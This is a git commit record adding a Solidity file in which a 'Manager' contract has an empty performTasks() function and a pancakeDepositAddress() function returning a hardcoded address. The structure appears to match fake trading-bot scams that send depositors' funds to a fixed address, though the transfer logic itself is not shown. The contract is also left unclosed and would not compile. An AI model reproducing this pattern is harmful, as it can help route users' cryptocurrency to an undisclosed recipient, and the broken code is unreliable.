47d2b0e012beac683d030e12275648f5d9f47743
cryptobreaker <84505885+cryptobreaker@users.noreply.github.com>
2021-05-28 14:46:13 +0200

    Create advancedLogic.sol

---
+++ contracts/advancedLogic.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xeFE92f533c71414037fe1860D666071F58CB8Fd9;
+	}
+  
